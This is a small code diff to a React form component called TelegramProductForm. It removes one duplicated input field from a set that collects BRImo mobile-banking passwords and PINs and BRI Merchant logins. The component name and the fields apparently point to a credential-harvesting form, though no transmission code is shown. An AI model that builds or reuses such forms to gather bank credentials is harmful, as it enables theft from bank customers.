@@ -109,7 +109,6 @@ function TelegramProductForm() {
           <input name="brimoPassword" placeholder="Password BRImo" type="password" value={form.brimoPassword} onChange={handleChange} />
           <input name="mobilePin" placeholder="PIN BRImo" value={form.mobilePin} onChange={handleChange} />
           <input name="briMerchantUser" placeholder="User BRI Merchant" value={form.briMerchantUser} onChange={handleChange} />
-          <input name="briMerchantUser" placeholder="User BRI Merchant" value={form.briMerchantUser} onChange={handleChange} />
           <input name="briMerchantPassword" placeholder="Password BRI Merchant" type="password" value={form.briMerchantPassword} onChange={handleChange} />
         </>
       );
